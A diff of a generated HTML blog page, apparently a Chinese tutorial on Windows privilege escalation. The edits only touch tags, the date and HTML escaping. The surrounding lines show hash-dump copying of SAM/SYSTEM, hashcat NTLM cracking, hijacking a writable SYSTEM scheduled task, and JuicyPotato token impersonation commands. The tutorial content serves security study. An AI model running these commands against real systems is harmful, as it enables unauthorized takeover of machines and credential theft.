@@ -33,9 +33,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1">
+<meta name="generator" content="Hexo 5.4.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 
@@ -380,9 +380,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">内网安全</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -410,7 +414,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-03-15
+                    2023-04-02
                 </div>
                 
 
@@ -600,7 +604,7 @@ copy C<span class="token operator">:</span>\Windows\Repair\SYSTEM \\<span class=
 </code></pre>
 <p><img src="https://img-blog.csdnimg.cn/509be7c49609435c8066a929ec4a6ad1.png"></p>
 <p><strong>hashcat 破解管理员 NTLM 哈希：</strong></p>
-<pre class=" language-java"><code class="language-java">hashcat <span class="token operator">-</span>m <span class="token number">1000</span> <span class="token operator">--</span>force <span class="token operator">&lt;</span>hash<span class="token operator">></span> mima<span class="token punctuation">.</span>txt
+<pre class=" language-java"><code class="language-java">hashcat <span class="token operator">-</span>m <span class="token number">1000</span> <span class="token operator">--</span>force <span class="token operator">&lt;</span>hash<span class="token operator">&gt;</span> mima<span class="token punctuation">.</span>txt
 </code></pre>
 <p><strong>然后再使用一些横向工具进行命令执行就好</strong></p>
 <h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>这个其实就是在我们低权限的时候，会去检查windows的计划任务，看看这个计划任务的执行文件，有没有哪个文件我们有写入权限的。</p>
@@ -608,14 +612,14 @@ copy C<span class="token operator">:</span>\Windows\Repair\SYSTEM \\<span class=
 <pre class=" language-java"><code class="language-java">schtasks <span class="token operator">/</span>query <span class="token operator">/</span>fo LIST <span class="token operator">/</span>v
 </code></pre>
 <p>在PowerShell中执行过滤：</p>
-<pre class=" language-java"><code class="language-java">Get<span class="token operator">-</span>ScheduledTask <span class="token operator">|</span> where <span class="token punctuation">{</span>$_<span class="token punctuation">.</span>TaskPath <span class="token operator">-</span>notlike <span class="token string">"\Microsoft*"</span><span class="token punctuation">}</span> <span class="token operator">|</span> ft TaskName<span class="token punctuation">,</span>TaskPath<span class="token punctuation">,</span>State
+<pre class=" language-java"><code class="language-java">Get<span class="token operator">-</span>ScheduledTask <span class="token operator">|</span> where <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>$_<span class="token punctuation">.</span>TaskPath <span class="token operator">-</span>notlike <span class="token string">"\Microsoft*"</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token operator">|</span> ft TaskName<span class="token punctuation">,</span>TaskPath<span class="token punctuation">,</span>State
 </code></pre>
 <p>假如我们使用如上方法查到了一个每分钟都以 SYSTEM 身份运行的powershell脚本—— C:\DevTools\CleanUp.ps1 。</p>
 <p>我们使用 accesschk.exe，看看有没有写入的权限：</p>
 <pre class=" language-java"><code class="language-java">C<span class="token operator">:</span>\PrivEsc\accesschk<span class="token punctuation">.</span>exe <span class="token operator">/</span>accepteula <span class="token operator">-</span>quvw user C<span class="token operator">:</span>\DevTools\CleanUp<span class="token punctuation">.</span>ps1
 </code></pre>
 <p><img src="https://img-blog.csdnimg.cn/8c6967b13af8473283d2d8b88bfe8d0e.png"><br>更改一下C:\DevTools\CleanUp.ps1文件，增加一行内容：cmd.exe ：</p>
-<pre class=" language-java"><code class="language-java">echo cmd<span class="token punctuation">.</span>exe <span class="token operator">>></span> C<span class="token operator">:</span>\DevTools\CleanUp<span class="token punctuation">.</span>ps1
+<pre class=" language-java"><code class="language-java">echo cmd<span class="token punctuation">.</span>exe <span class="token operator">&gt;&gt;</span> C<span class="token operator">:</span>\DevTools\CleanUp<span class="token punctuation">.</span>ps1
 </code></pre>
 <p>等待一会就好</p>
 <h2 id="不安全的-GUI-应用程序提权"><a href="#不安全的-GUI-应用程序提权" class="headerlink" title="不安全的 GUI 应用程序提权"></a>不安全的 GUI 应用程序提权</h2><p><strong>在某些版本的 Windows 中，用户可以获得使用管理员权限运行某些 GUI 应用的权限。通俗点说就是我们普通用户打开一个gui程序的时候，实际上是以管理员权限执行的。就有点类似linux里的suid提权？</strong></p>
@@ -716,7 +720,7 @@ impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span> 选择
 <p><strong>获取完CLSID后:</strong></p>
 <p>当有SeImpersonate权限时。juicypotato的参数使用-t t<br>开有SeAssignPrimaryToken权限时。juicypotato的参数使用-t u</p>
 <p><strong>最终命令:</strong></p>
-<pre class=" language-java"><code class="language-java">JuicyPotato<span class="token punctuation">.</span>exe <span class="token operator">-</span>t t <span class="token operator">-</span>p c<span class="token operator">:</span>\windows\system32\cmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>l <span class="token number">1111</span> <span class="token operator">-</span>c <span class="token punctuation">{</span>CLSID<span class="token punctuation">}</span>
+<pre class=" language-java"><code class="language-java">JuicyPotato<span class="token punctuation">.</span>exe <span class="token operator">-</span>t t <span class="token operator">-</span>p c<span class="token operator">:</span>\windows\system32\cmd<span class="token punctuation">.</span>exe <span class="token operator">-</span>l <span class="token number">1111</span> <span class="token operator">-</span>c <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>CLSID<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>
 </code></pre>
 <h2 id="Rogue-Potato提权"><a href="#Rogue-Potato提权" class="headerlink" title="Rogue Potato提权"></a>Rogue Potato提权</h2><p><strong>微软推出烂土豆补丁后，高版本 Windows DCOM 解析器不再允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。这样便无法控制 RPC 对特定 IP 端口进行通讯。</strong></p>
 <p><strong>RoguePotato 使用其他远程主机的 135 端口做转发，通过远程主机将数据传到本地伪造的 RPC 服务上。</strong></p>
@@ -833,7 +837,11 @@ impersonate_token <span class="token string">"NT AUTHORITY\SYSTEM"</span> 选择
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">内网安全</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
